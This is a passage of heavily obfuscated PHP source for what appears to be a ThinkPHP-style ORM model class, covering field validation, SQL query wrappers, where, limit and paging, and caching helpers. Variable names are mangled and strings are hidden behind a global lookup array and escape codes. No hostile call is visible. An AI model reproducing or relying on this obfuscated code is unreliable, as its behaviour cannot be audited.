$äíÂ¼¨ì[2] || $äíÂ¼¨ì[2] == THINK_MODEL_BOTH) { switch (trim($äíÂ¼¨ì[3])) { case $ôï¹é–—[398]: case $ôï¹é–—[399]: $“Äáµ¯ = isset($äíÂ¼¨ì[4]) ? (array) $äíÂ¼¨ì[4] : array(); if (isset($şÒ¸Şı³[$äíÂ¼¨ì[0]])) { array_unshift($“Äáµ¯, $şÒ¸Şı³[$äíÂ¼¨ì[0]]); } if ($ôï¹é–—[398] == $äíÂ¼¨ì[3]) { $şÒ¸Şı³[$äíÂ¼¨ì[0]] = call_user_func_array($äíÂ¼¨ì[1], $“Äáµ¯); } else { $şÒ¸Şı³[$äíÂ¼¨ì[0]] = call_user_func_array(array(&$this, $äíÂ¼¨ì[1]), $“Äáµ¯); } break; case $ôï¹é–—[353]: $şÒ¸Şı³[$äíÂ¼¨ì[0]] = $şÒ¸Şı³[$äíÂ¼¨ì[1]]; break; case $ôï¹é–—[400]: if ($ôï¹é–—[12] === $şÒ¸Şı³[$äíÂ¼¨ì[0]]) { unset($şÒ¸Şı³[$äíÂ¼¨ì[0]]); } break; case $ôï¹é–—[401]: default: $şÒ¸Şı³[$äíÂ¼¨ì[0]] = $äíÂ¼¨ì[1]; } if (!1 === $şÒ¸Şı³[$äíÂ¼¨ì[0]]) { unset($şÒ¸Şı³[$äíÂ¼¨ì[0]]); } } } } return $şÒ¸Şı³; } protected function autoValidation($®·¦¿–, $œ³¬Éø) { $ûø–ö³ğ =& $_SERVER[Î·Ü›öğ]; if (!empty($this->options[$ûø–ö³ğ[402]])) { $´ãÒ…æµ = $this->options[$ûø–ö³ğ[402]]; unset($this->options[$ûø–ö³ğ[402]]); } elseif (!empty($this->_validate)) { $´ãÒ…æµ = $this->_validate; } if (isset($´ãÒ…æµ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($´ãÒ…æµ as $ÓÈçË˜ => $ü¿¬ÏŸ) { if (empty($ü¿¬ÏŸ[5]) || $ü¿¬ÏŸ[5] == THINK_MODEL_BOTH || $ü¿¬ÏŸ[5] == $œ³¬Éø) { if (0 == strpos($ü¿¬ÏŸ[2], $ûø–ö³ğ[403]) && strpos($ü¿¬ÏŸ[2], $ûø–ö³ğ[404])) { $ü¿¬ÏŸ[2] = think_lang(substr($ü¿¬ÏŸ[2], 2, -1)); } $ü¿¬ÏŸ[3] = isset($ü¿¬ÏŸ[3]) ? $ü¿¬ÏŸ[3] : THINK_EXISTS_VALIDATE; $ü¿¬ÏŸ[4] = isset($ü¿¬ÏŸ[4]) ? $ü¿¬ÏŸ[4] : $ûø–ö³ğ[405]; switch ($ü¿¬ÏŸ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($®·¦¿–, $ü¿¬ÏŸ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ûø–ö³ğ[12] != trim($®·¦¿–[$ü¿¬ÏŸ[0]])) { if (!1 === $this->_validationField($®·¦¿–, $ü¿¬ÏŸ)) { return !1; } } break; default: if (isset($®·¦¿–[$ü¿¬ÏŸ[0]])) { if (!1 === $this->_validationField($®·¦¿–, $ü¿¬ÏŸ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($×œŠ‰œ, $ìÎÀ•˜«) { if (!1 === $this->_validationFieldItem($×œŠ‰œ, $ìÎÀ•˜«)) { if ($this->patchValidate) { $this->error[$ìÎÀ•˜«[0]] = $ìÎÀ•˜«[2]; } else { $this->error = $ìÎÀ•˜«[2]; return !1; } } return; } protected function _validationFieldItem($íƒâ†ûÔ, $˜š†Ëï×) { $úÉªÂ¹š =& $_SERVER[Î·Ü›öğ]; switch (strtolower(trim($˜š†Ëï×[4]))) { case $úÉªÂ¹š[398]: case $úÉªÂ¹š[399]: $—å¬„½ = isset($˜š†Ëï×[6]) ? (array) $˜š†Ëï×[6] : array(); if (is_string($˜š†Ëï×[0]) && strpos($˜š†Ëï×[0], $úÉªÂ¹š[50])) { $˜š†Ëï×[0] = explode($úÉªÂ¹š[50], $˜š†Ëï×[0]); } if (is_array($˜š†Ëï×[0])) { foreach ($˜š†Ëï×[0] as $Ì¦ôÊ³) { $Ïçàäú’[$Ì¦ôÊ³] = $íƒâ†ûÔ[$Ì¦ôÊ³]; } array_unshift($—å¬„½, $Ïçàäú’); } else { array_unshift($—å¬„½, $íƒâ†ûÔ[$˜š†Ëï×[0]]); } if ($úÉªÂ¹š[398] == $˜š†Ëï×[4]) { return call_user_func_array($˜š†Ëï×[1], $—å¬„½); } else { return call_user_func_array(array(&$this, $˜š†Ëï×[1]), $—å¬„½); } case $úÉªÂ¹š[406]: return $íƒâ†ûÔ[$˜š†Ëï×[0]] == $íƒâ†ûÔ[$˜š†Ëï×[1]]; case $úÉªÂ¹š[407]: if (is_string($˜š†Ëï×[0]) && strpos($˜š†Ëï×[0], $úÉªÂ¹š[50])) { $˜š†Ëï×[0] = explode($úÉªÂ¹š[50], $˜š†Ëï×[0]); } $Îûİ…“ = array(); if (is_array($˜š†Ëï×[0])) { foreach ($˜š†Ëï×[0] as $Ì¦ôÊ³) { $Îûİ…“[$Ì¦ôÊ³] = $íƒâ†ûÔ[$Ì¦ôÊ³]; } } else { $Îûİ…“[$˜š†Ëï×[0]] = $íƒâ†ûÔ[$˜š†Ëï×[0]]; } if (!empty($íƒâ†ûÔ[$this->getPk()])) { $Îûİ…“[$this->getPk()] = array($úÉªÂ¹š[408], $íƒâ†ûÔ[$this->getPk()]); } if ($this->where($Îûİ…“)->find()) { return !1; } return !0; default: return $this->check($íƒâ†ûÔ[$˜š†Ëï×[0]], $˜š†Ëï×[1], $˜š†Ëï×[4]); } } public function check($à»…ç¦–, $ïº¼¹±Ë, $¬åô¢ è = "\x72\145\147\145\x78") { $ƒÚÉØ®¡ =& $_SERVER[Î·Ü›öğ]; $¬åô¢ è = strtolower(trim($¬åô¢ è)); switch ($¬åô¢ è) { case $ƒÚÉØ®¡[7]: case $ƒÚÉØ®¡[409]: $ÔĞ•­ ¥ = is_array($ïº¼¹±Ë) ? $ïº¼¹±Ë : explode($ƒÚÉØ®¡[50], $ïº¼¹±Ë); return $¬åô¢ è == $ƒÚÉØ®¡[7] ? in_array($à»…ç¦–, $ÔĞ•­ ¥) : !in_array($à»…ç¦–, $ÔĞ•­ ¥); case $ƒÚÉØ®¡[410]: case $ƒÚÉØ®¡[411]: if (is_array($ïº¼¹±Ë)) { $„÷…·‹Î = $ïº¼¹±Ë[0]; $±ÏÖÊşâ = $ïº¼¹±Ë[1]; } else { list($„÷…·‹Î, $±ÏÖÊşâ) = explode($ƒÚÉØ®¡[50], $ïº¼¹±Ë); } return $¬åô¢ è == $ƒÚÉØ®¡[410] ? $à»…ç¦– >= $„÷…·‹Î && $à»…ç¦– <= $±ÏÖÊşâ : $à»…ç¦– < $„÷…·‹Î || $à»…ç¦– > $±ÏÖÊşâ; case $ƒÚÉØ®¡[412]: case $ƒÚÉØ®¡[413]: return $¬åô¢ è == $ƒÚÉØ®¡[412] ? $à»…ç¦– == $ïº¼¹±Ë : $à»…ç¦– != $ïº¼¹±Ë; case $ƒÚÉØ®¡[414]: $Â¬İûÏ’ = mb_strlen($à»…ç¦–, $ƒÚÉØ®¡[415]); if (strpos($ïº¼¹±Ë, $ƒÚÉØ®¡[50])) { list($„÷…·‹Î, $±ÏÖÊşâ) = explode($ƒÚÉØ®¡[50], $ïº¼¹±Ë); return $Â¬İûÏ’ >= $„÷…·‹Î && $Â¬İûÏ’ <= $±ÏÖÊşâ; } else { return $Â¬İûÏ’ == $ïº¼¹±Ë; } case $ƒÚÉØ®¡[416]: list($†ûƒ§´, $¥‹ÈĞÄ) = explode($ƒÚÉØ®¡[50], $ïº¼¹±Ë); if (!is_numeric($†ûƒ§´)) { $†ûƒ§´ = strtotime($†ûƒ§´); } if (!is_numeric($¥‹ÈĞÄ)) { $¥‹ÈĞÄ = strtotime($¥‹ÈĞÄ); } return NOW_TIME >= $†ûƒ§´ && NOW_TIME <= $¥‹ÈĞÄ; case $ƒÚÉØ®¡[417]: return in_array(get_client_ip(), explode($ƒÚÉØ®¡[50], $ïº¼¹±Ë)); case $ƒÚÉØ®¡[418]: return !in_array(get_client_ip(), explode($ƒÚÉØ®¡[50], $ïº¼¹±Ë)); case $ƒÚÉØ®¡[405]: default: return $this->regex($à»…ç¦–, $ïº¼¹±Ë); } } public function query($¼…Œà³ê, $©©ÖıÛ÷ = false) { $óºå¾· =& $_SERVER[Î·Ü›öğ]; if (!is_bool($©©ÖıÛ÷) && !is_array($©©ÖıÛ÷)) { $©©ÖıÛ÷ = func_get_args(); array_shift($©©ÖıÛ÷); } $¼…Œà³ê = str_replace(array($óºå¾·[288], $óºå¾·[419]), $óºå¾·[53], $¼…Œà³ê); $¼…Œà³ê = $this->parseSql($¼…Œà³ê, $©©ÖıÛ÷); return $this->db->query($¼…Œà³ê); } public function execute($»Ö³–ˆì, $µºšèúØ = false) { if (!is_bool($µºšèúØ) && !is_array($µºšèúØ)) { $µºšèúØ = func_get_args(); array_shift($µºšèúØ); } $»Ö³–ˆì = $this->parseSql($»Ö³–ˆì, $µºšèúØ); return $this->db->execute($»Ö³–ˆì); } protected function parseSql($›ı«–˜©, $×Øë´å¶) { $©ÇØÙ´ =& $_SERVER[Î·Ü›öğ]; if (!0 === $×Øë´å¶) { $È©²Ç¥Ü = $this->_parseOptions(); $›ı«–˜© = $this->db->parseSql($›ı«–˜©, $È©²Ç¥Ü); } elseif (is_array($×Øë´å¶)) { $×Øë´å¶ = array_map(array($this->db, $©ÇØÙ´[420]), $×Øë´å¶); $›ı«–˜© = vsprintf($›ı«–˜©, $×Øë´å¶); } else { $›ı«–˜© = strtr($›ı«–˜©, array($©ÇØÙ´[421] => $this->getTableName(), $©ÇØÙ´[422] => think_config($©ÇØÙ´[324]))); } $this->db->setModel($this->name); return $›ı«–˜©; } public function db($Üäå‘Ù‡ = '', $ñ¸Ì± = '', $®Â’½‚Â = array()) { $Æ¡ÂìæÄ =& $_SERVER[Î·Ü›öğ]; if ($Æ¡ÂìæÄ[12] === $Üäå‘Ù‡ && $this->db) { return $this->db; } static $­¼Àä®õ = array(); static $ëãÆÎ±æ = array(); if (!isset($ëãÆÎ±æ[$Üäå‘Ù‡]) || isset($ëãÆÎ±æ[$Üäå‘Ù‡]) && $ñ¸Ì± && $­¼Àä®õ[$Üäå‘Ù‡] != $ñ¸Ì±) { if (!empty($ñ¸Ì±) && is_string($ñ¸Ì±) && !1 === strpos($ñ¸Ì±, $Æ¡ÂìæÄ[8])) { $ñ¸Ì± = think_config($ñ¸Ì±); } $Üäå‘Ù‡ = think_guid($ñ¸Ì±); $ëãÆÎ±æ[$Üäå‘Ù‡] = Db::getInstance($ñ¸Ì±); } elseif (NULL === $ñ¸Ì±) { $ëãÆÎ±æ[$Üäå‘Ù‡]->close(); unset($ëãÆÎ±æ[$Üäå‘Ù‡]); return; } if (!empty($®Â’½‚Â)) { if (is_string($®Â’½‚Â)) { parse_str($®Â’½‚Â, $®Â’½‚Â); } foreach ($®Â’½‚Â as $ÓÄŞ›Æ => $˜¶â‚æÂ) { $this->setProperty($ÓÄŞ›Æ, $˜¶â‚æÂ); } } $­¼Àä®õ[$Üäå‘Ù‡] = $ñ¸Ì±; $this->db = $ëãÆÎ±æ[$Üäå‘Ù‡]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÓôÈÀİ¨ = get_class($this); if ($ÓôÈÀİ¨ == $_SERVER[Î·Ü›öğ][423]) { return $this->name; } $this->name = substr($ÓôÈÀİ¨, 0, -5); } return $this->name; } public function getTableName() { $æ¤´´Å =& $_SERVER[Î·Ü›öğ]; if (empty($this->trueTableName)) { $Šøñ·Ã½ = !empty($this->tablePrefix) ? $this->tablePrefix : $æ¤´´Å[12]; if (!empty($this->tableName)) { $Šøñ·Ã½ .= $this->tableName; } else { $Šøñ·Ã½ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Šøñ·Ã½); } return (!empty($this->dbName) ? $this->dbName . $æ¤´´Å[10] : $æ¤´´Å[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ˆ¸¢ï¸ =& $_SERVER[Î·Ü›öğ]; return isset($this->fields[$ˆ¸¢ï¸[331]]) ? $this->fields[$ˆ¸¢ï¸[331]] : $this->pk; } public function getDbFields() { $»À‰Å—‚ =& $_SERVER[Î·Ü›öğ]; if (isset($this->options[$»À‰Å—‚[359]])) { $â¬¢ĞŸ = $this->db->getFields($this->options[$»À‰Å—‚[359]]); return $â¬¢ĞŸ ? array_keys($â¬¢ĞŸ) : !1; } if ($this->fields) { $â¬¢ĞŸ = $this->fields; unset($â¬¢ĞŸ[$»À‰Å—‚[330]], $â¬¢ĞŸ[$»À‰Å—‚[331]], $â¬¢ĞŸ[$»À‰Å—‚[332]], $â¬¢ĞŸ[$»À‰Å—‚[329]]); return $â¬¢ĞŸ; } return !1; } public function data($œ´¶øÛá = '') { $²ıÄæ”ë =& $_SERVER[Î·Ü›öğ]; if ($²ıÄæ”ë[12] === $œ´¶øÛá && !empty($this->data)) { return $this->data; } if (is_object($œ´¶øÛá)) { $œ´¶øÛá = get_object_vars($œ´¶øÛá); } elseif (is_string($œ´¶øÛá)) { parse_str($œ´¶øÛá, $œ´¶øÛá); } elseif (!is_array($œ´¶øÛá)) { think_exception(think_lang($²ıÄæ”ë[351])); } $this->data = $œ´¶øÛá; return $this; } public function join($¢†æ—â) { $ ©ô¨À¬ =& $_SERVER[Î·Ü›öğ]; if (is_array($¢†æ—â)) { $this->options[$ ©ô¨À¬[362]] = $¢†æ—â; } elseif (!empty($¢†æ—â)) { $this->options[$ ©ô¨À¬[362]][] = $¢†æ—â; } return $this; } public function union($×Åšï²Ä, $Çòİü€¤ = false) { $ôöÛÍæ› =& $_SERVER[Î·Ü›öğ]; if (empty($×Åšï²Ä)) { return $this; } if ($Çòİü€¤) { $this->options[$ôöÛÍæ›[424]][$ôöÛÍæ›[425]] = !0; } if (is_object($×Åšï²Ä)) { $×Åšï²Ä = get_object_vars($×Åšï²Ä); } if (is_string($×Åšï²Ä)) { $š˜Ôşè = $×Åšï²Ä; } elseif (is_array($×Åšï²Ä)) { if (isset($×Åšï²Ä[0])) { $this->options[$ôöÛÍæ›[424]] = array_merge($this->options[$ôöÛÍæ›[424]], $×Åšï²Ä); return $this; } else { $š˜Ôşè = $×Åšï²Ä; } } else { think_exception(think_lang($ôöÛÍæ›[351])); } $this->options[$ôöÛÍæ›[424]][] = $š˜Ôşè; return $this; } public function cache($Í¬ˆá§ª = true, $Úö‘‚¹ = null, $Û‰‚– = '') { $Ø¿÷Šƒõ =& $_SERVER[Î·Ü›öğ]; if (!1 !== $Í¬ˆá§ª) { $this->options[$Ø¿÷Šƒõ[426]] = array($Ø¿÷Šƒõ[97] => $Í¬ˆá§ª, $Ø¿÷Šƒõ[416] => $Úö‘‚¹, $Ø¿÷Šƒõ[33] => $Û‰‚–); } return $this; } public function field($ä°½®ë­, $™•“Í´ç = false) { $ÑıÒ†²— =& $_SERVER[Î·Ü›öğ]; if (!0 === $ä°½®ë­) { $‡Ã‡´˜ = $this->getDbFields(); $ä°½®ë­ = $‡Ã‡´˜ ? $‡Ã‡´˜ : $ÑıÒ†²—[223]; } elseif ($™•“Í´ç) { if (is_string($ä°½®ë­)) { $ä°½®ë­ = explode($ÑıÒ†²—[50], $ä°½®ë­); } $‡Ã‡´˜ = $this->getDbFields(); $ä°½®ë­ = $‡Ã‡´˜ ? array_diff($‡Ã‡´˜, $ä°½®ë­) : $ä°½®ë­; } $this->options[$ÑıÒ†²—[353]] = $ä°½®ë­; return $this; } public function scope($…Ãåœîœ = '', $Ğ–Ğ¾ŞÊ = NULL) { $Ù“ƒ¶²ê =& $_SERVER[Î·Ü›öğ]; if ($Ù“ƒ¶²ê[12] === $…Ãåœîœ) { if (isset($this->_scope[$Ù“ƒ¶²ê[37]])) { $ÅÏ«õé… = $this->_scope[$Ù“ƒ¶²ê[37]]; } else { return $this; } } elseif (is_string($…Ãåœîœ)) { $ºù×£Ù = explode($Ù“ƒ¶²ê[50], $…Ãåœîœ); $ÅÏ«õé… = array(); foreach ($ºù×£Ù as $â™Ò¿ğ) { if (!isset($this->_scope[$â™Ò¿ğ])) { continue; } $ÅÏ«õé… = array_merge($ÅÏ«õé…, $this->_scope[$â™Ò¿ğ]); } if (!empty($Ğ–Ğ¾ŞÊ) && is_array($Ğ–Ğ¾ŞÊ)) { $ÅÏ«õé… = array_merge($ÅÏ«õé…, $Ğ–Ğ¾ŞÊ); } } elseif (is_array($…Ãåœîœ)) { $ÅÏ«õé… = $…Ãåœîœ; } if (is_array($ÅÏ«õé…) && !empty($ÅÏ«õé…)) { $this->options = array_merge($this->options, array_change_key_case($ÅÏ«õé…)); } return $this; } public function where($Ì›ûìÌ‚, $—½Ä‹ëÂ = null) { $ìøğõúË =& $_SERVER[Î·Ü›öğ]; if (!is_null($—½Ä‹ëÂ) && is_string($Ì›ûìÌ‚)) { if (!is_array($—½Ä‹ëÂ)) { $—½Ä‹ëÂ = func_get_args(); array_shift($—½Ä‹ëÂ); } $—½Ä‹ëÂ = array_map(array($this->db, $ìøğõúË[420]), $—½Ä‹ëÂ); $Ì›ûìÌ‚ = vsprintf($Ì›ûìÌ‚, $—½Ä‹ëÂ); } elseif (is_object($Ì›ûìÌ‚)) { $Ì›ûìÌ‚ = get_object_vars($Ì›ûìÌ‚); } elseif (is_array($Ì›ûìÌ‚)) { foreach ($Ì›ûìÌ‚ as $»«ãÃµƒ => $¸™Ğ”İ‰) { if ((is_numeric($»«ãÃµƒ) || !$»«ãÃµƒ) && is_string($¸™Ğ”İ‰)) { if (strpos($¸™Ğ”İ‰, $ìøğõúË[427]) === 0) { continue; } think_trace($ìøğõúË[428], $ìøğõúË[12], $ìøğõúË[49]); die; } } } if (is_string($Ì›ûìÌ‚) && $ìøğõúË[12] != $Ì›ûìÌ‚) { $¹ûç¦ÎÉ = array(); $¹ûç¦ÎÉ[$ìøğõúË[429]] = $Ì›ûìÌ‚; $Ì›ûìÌ‚ = $¹ûç¦ÎÉ; } if (isset($this->options[$ìøğõúË[355]])) { $this->options[$ìøğõúË[355]] = array_merge($this->options[$ìøğõúË[355]], $Ì›ûìÌ‚); } else { $this->options[$ìøğõúË[355]] = $Ì›ûìÌ‚; } return $this; } public function limit($¥ˆÅ¶†, $»ÂßóŒ = null) { $ì«™·€é =& $_SERVER[Î·Ü›öğ]; $this->options[$ì«™·€é[370]] = is_null($»ÂßóŒ) ? $¥ˆÅ¶† : $¥ˆÅ¶† . $ì«™·€é[50] . $»ÂßóŒ; return $this; } public function page($ëó‡×÷Æ, $µéÄ¡© = null) { $å×ö–Ã =& $_SERVER[Î·Ü›öğ]; $this->options[$å×ö–Ã[430]] = is_null($µéÄ¡©) ? $ëó‡×÷Æ : $ëó‡×÷Æ . $å×ö–Ã[50] . $µéÄ¡©; return $this; } public function comment($íû‰Â¼Ş) { $this->options[$_SERVER[Î·Ü›öğ][431]] = $íû‰Â¼Ş; return $this; } public function setProperty($®ƒÄ˜ì, $¥§§È) { if (property_exists($this, $®ƒÄ˜ì)) { $this->{$®ƒÄ˜ì} = $¥§§È; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\171\x54\151\x6d\145", "\164\x69\155\x65", "\x69\156\x73\x65\x72\164\x2c\x75\x70\x64\141\x74\x65", "\x66\x75\156\143\164\151\x6f\156"), array("\143\162\145\141\x74\x65\124\x69\x6d\145", "\164\x69\x6d\145", "\151\156\x73\x65\162\x74", "\x66\x75\156\x63\x74\151\x6f\156")); public function setDataAuto($³‚ç§Æ) { $this->dataAuto = $³‚ç§Æ; } public function __construct($ãÀë³Ë = '', $ú°­¤†ş = '', $ññ¤ÀØ„ = '') { parent::__construct($ãÀë³Ë, $ú°­¤†ş, $ññ¤ÀØ„); } protected $tableMeta = array(); protected function _beforeInsert(&$ø§êòé¬, $´ŒÓŠ”ı) { $Ãõ†ìæ =& $_SERVER[Î·Ü›öğ]; if (!$this->checkDataAutoHas($Ãõ†ìæ[432])) { return; } $this->dataBeforeFilter($ø§êòé¬, $Ãõ†ìæ[432]); } protected function _beforeUpdate(&$® “Åƒñ, $áş‘ËÎŸ) { $İ„Óôè× =& $_SERVER[Î·Ü›öğ]; if (!$this->checkDataAutoHas($İ„Óôè×[433])) { return; } $this->dataBeforeFilter($® “Åƒñ, $İ„Óôè×[433]); } protected function _afterSelect(&$ÀÆÂƒü¨, $èÄ„£ŒÁ) { if (!is_array($ÀÆÂƒü¨)) { return; } if (!$this->checkDataAutoHas($_SERVER[Î·Ü›öğ][434])) { return; } foreach ($ÀÆÂƒü¨ as &$­ØŞŠ) { $this->dataAfterFilter($­ØŞŠ); } unset($­ØŞŠ); } protected function _afterFind(&$‘­å—õ, $ÉşÒ•¨) { if (!is_array($‘­å—õ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Î·Ü›öğ][434])) { return; } $this->dataAfterFilter($‘­å—õ); } public static function textEncode($ìŞù¯‰„) { if (!$ìŞù¯‰„) { return $ìŞù¯‰„; } $µÖş—º = json_encode($ìŞù¯‰„); $µÖş—º = preg_replace_callback($_SERVER[Î·Ü›öğ][435], function ($×·óÛà) { return addslashes($×·óÛà[0]); }, $µÖş—º); return json_decode($µÖş—º); } public static function textDecode($ÁòğØèĞ) { $æûè·À° =& $_SERVER[Î·Ü›öğ]; $¬•¬ÃùÑ = json_encode($ÁòğØèĞ); $¬•¬ÃùÑ = preg_replace_callback($æûè·À°[436], function ($…¥üŒøŞ) { return $_SERVER[Î·Ü›öğ][100]; }, $¬•¬ÃùÑ); return json_decode($¬•¬ÃùÑ); } public function setAutoIncrement($ËĞĞª¡œ) { $²°ç’ìŞ = array($this->getPk() => $ËĞĞª¡œ); $ƒşú•‘ = $this->data($²°ç’ìŞ)->add(); if ($ƒşú•‘) { $this->delete($ƒşú•‘); } } public function getAutoIncrement() { $ˆÃĞÂ¹¢ = $this->getTableName(); $é¢ç”ûÆ = $this->max($this->getPk()); $ˆ£æŠÄ¢ = $this->query("\x73\150\157\167\x20\x74\141\142\154\x65\x20\x73\164\141\x74\165\x73\x20\x77\150\x65\162\145\40\x4e\x61\155\x65\x3d\47{$ˆÃĞÂ¹¢}\47"); $Ì¯ÅñÊµ = $ˆ£æŠÄ¢[0][$_SERVER[Î·Ü›öğ][437]]; $ë‰Ä”Ó = max($é¢ç”ûÆ, $Ì¯ÅñÊµ); return $ë‰Ä”Ó; } protected function _callBefore($ıí¿ˆ™Û, $µ÷„Ôå®) { return $this->cacheCallCheck($ıí¿ˆ™Û, $µ÷„Ôå®, !1); } protected function _callAfter($‘æ´äá, $¤ÛÄ‚íƒ) { return $this->cacheCallCheck($‘æ´äá, $¤ÛÄ‚íƒ, !0); } protected function cacheFunctionAlias($—·¹ˆÑ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($®ØŠ„û, $ÓŸØ©ğ¥, $ıÛ©›Ÿ = false) { $¦œ¼è =& $_SERVER[Î·Ü›öğ]; $•”Éëìé = $this->cacheFunctionAlias($ÓŸØ©ğ¥); if (!$•”Éëìé) { return; } foreach ($•”Éëìé as $£Ø…æ«ê => $¶ó ²šª) { $éê¾‡£¦ = $¶ó ²šª[0]; $Ğ•¾õÒÂ = explode($¦œ¼è[50], $¶ó ²šª[1]); $Šõ£ù…¤ = isset($¶ó ²šª[2]) ? $¶ó ²šª[2] : $¦œ¼è[12]; if ($®ØŠ„û == $£Ø…æ«ê) { return $this->cacheFunctionGet($£Ø…æ«ê, $éê¾‡£¦, $Šõ£ù…¤); } if ($ıÛ©›Ÿ && in_array($®ØŠ„û, $Ğ•¾õÒÂ)) { $this->cacheFunctionClear($£Ø…æ«ê, $éê¾‡£¦, $Šõ£ù…¤); } } } public function cacheFunctionGet($òî¬ñî°, $‘Ú‹ÒÁ¡, $¶Áƒíİ“ = '') { $İ¡´İëâ = $this->cacheKeyMake($òî¬ñî°, $‘Ú‹ÒÁ¡, $¶Áƒíİ“); $Û¨¤â¹ = Cache::get($İ¡´İëâ); if (!is_array($Û¨¤â¹)) { $Û¨¤â¹ = call_user_func_array(array($this, $òî¬ñî°), array($‘Ú‹ÒÁ¡, !0)); Cache::set($İ¡´İëâ, $Û¨¤â¹); } return $Û¨¤â¹; } public function cacheFunctionClear($•„Íç¾Œ, $‡Ñ·ÏÔ, $¨™º†æŠ = '') { $„ë–¹Æ† = $‡Ñ·ÏÔ; if (!is_array($‡Ñ·ÏÔ)) { $„ë–¹Æ† = array($‡Ñ·ÏÔ); } foreach ($„ë–¹Æ† as $Èñğ€¹Ê) { $ó¼¼†æÙ = $this->cacheKeyMake($•„Íç¾Œ, $Èñğ€¹Ê, $¨™º†æŠ); Cache::remove($ó¼¼†æÙ); } } public function cacheKeyMake($ë¨“¶îÔ, $Èƒû†©½, $–Í”¼áÅ) { $±®º› =& $_SERVER[Î·Ü›öğ]; if ($–Í”¼áÅ) { $Èƒû†©½ = $Èƒû†©½ . $±®º›[438] . $–Í”¼áÅ; } return get_class($this) . $±®º›[11] . $ë¨“¶îÔ . $±®º›[439] . $Èƒû†©½; } protected function selectPageReset() { $Ç¢ÔÛ¶Ò =& $_SERVER[Î·Ü›öğ]; if (isset($GLOBALS[$Ç¢ÔÛ¶Ò[440]])) { return; } $GLOBALS[$Ç¢ÔÛ¶Ò[440]] = isset($GLOBALS[$Ç¢ÔÛ¶Ò[7]][$Ç¢ÔÛ¶Ò[441]]) ? $GLOBALS[$Ç¢ÔÛ¶Ò[7]][$Ç¢ÔÛ¶Ò[441]] : !1; $GLOBALS[$Ç¢ÔÛ¶Ò[442]] = isset($GLOBALS[$Ç¢ÔÛ¶Ò[7]][$Ç¢ÔÛ¶Ò[430]]) ? $GLOBALS[$Ç¢ÔÛ¶Ò[7]][$Ç¢ÔÛ¶Ò[430]] : !1; $GLOBALS[$Ç¢ÔÛ¶Ò[7]][$Ç¢ÔÛ¶Ò[441]] = !1; $GLOBALS[$Ç¢ÔÛ¶Ò[7]][$Ç¢ÔÛ¶Ò[430]] = !1; } protected function selectPageRestore() { $÷²öªÇ =& $_SERVER[Î·Ü›öğ]; if (!isset($GLOBALS[$÷²öªÇ[440]])) { return; } $GLOBALS[$÷²öªÇ[7]][$÷²öªÇ[441]] = $GLOBALS[$÷²öªÇ[440]]; $GLOBALS[$÷²öªÇ[7]][$÷²öªÇ[430]] = $GLOBALS[$÷²öªÇ[442]]; if ($GLOBALS[$÷²öªÇ[7]][$÷²öªÇ[441]] === !1) { unset($GLOBALS[$÷²öªÇ[7]][$÷²öªÇ[441]]); } if ($GLOBALS[$÷²öªÇ[7]][$÷²öªÇ[430]] === !1) { unset($GLOBALS[$÷²öªÇ[7]][$÷²öªÇ[430]]); } unset($GLOBALS[$÷²öªÇ[440]]); unset($GLOBALS[$÷²öªÇ[442]]); } protected function selectPage($¨Ö´àßÚ = 200, $éÉèÉ˜® = 1) { $ËÅçœÒ× =& $_SERVER[Î·Ü›öğ]; global $in; $Õ¼ÇÆ = $this->optionsValue(); $£÷¾ğ“ƒ = 50000; $¨Ö´àßÚ = isset($in[$ËÅçœÒ×[441]]) && $in[$ËÅçœÒ×[441]] ? $in[$ËÅçœÒ×[441]] : $¨Ö´àßÚ; if ($¨Ö´àßÚ === -1) { $in[$ËÅçœÒ×[441]] = !1; $£÷¾ğ“ƒ = 100000000; $¨Ö´àßÚ = $£÷¾ğ“ƒ; } $ìÕ›¼  = $Õ¼ÇÆ; $ìÕ›¼ [$ËÅçœÒ×[443]] = array(); $¨Ö´àßÚ = intval($¨Ö´àßÚ); $¨Ö´àßÚ = $¨Ö´àßÚ <= 5 ? 5 : ($¨Ö´àßÚ >= $£÷¾ğ“ƒ ? $£÷¾ğ“ƒ : $¨Ö´àßÚ); $éÉèÉ˜® = intval(isset($in[$ËÅçœÒ×[430]]) && $in[$ËÅçœÒ×[430]] ? $in[$ËÅçœÒ×[430]] : $éÉèÉ˜®); $éÉèÉ˜® = $éÉèÉ˜® <= 1 ? 1 : $éÉèÉ˜®; $ëõ¥‡Ğ = array(); $¯”´¬¥ = 1; if ($éÉèÉ˜® == 1 && $¯”´¬¥) { $this->optionsValue($Õ¼ÇÆ); $ëõ¥‡Ğ = $this->page($éÉèÉ˜®, $¨Ö´àßÚ)->select(); $®¬‹Şè» = is_array($ëõ¥‡Ğ) ? count($ëõ¥‡Ğ) : 0; if ($®¬‹Şè» < $¨Ö´àßÚ) { $°›ºˆ€ó = 1; } else { $this->optionsValue($ìÕ›¼ ); $®¬‹Şè» = intval($this->count()); $°›ºˆ€ó = ceil($®¬‹Şè» / $¨Ö´àßÚ); } } else { $this->optionsValue($ìÕ›¼ ); $®¬‹Şè» = intval($this->count()); $°›ºˆ€ó = ceil($®¬‹Şè» / $¨Ö´àßÚ); $éÉèÉ˜® = $éÉèÉ˜® >= $°›ºˆ€ó ? $°›ºˆ€ó : $éÉèÉ˜®; $this->optionsValue($Õ¼ÇÆ); $ëõ¥‡Ğ = $this->page($éÉèÉ˜®, $¨Ö´àßÚ)->select(); } if (!is_array($ëõ¥‡Ğ)) { $ëõ¥‡Ğ = array(); } if ($°›ºˆ€ó == 1) { 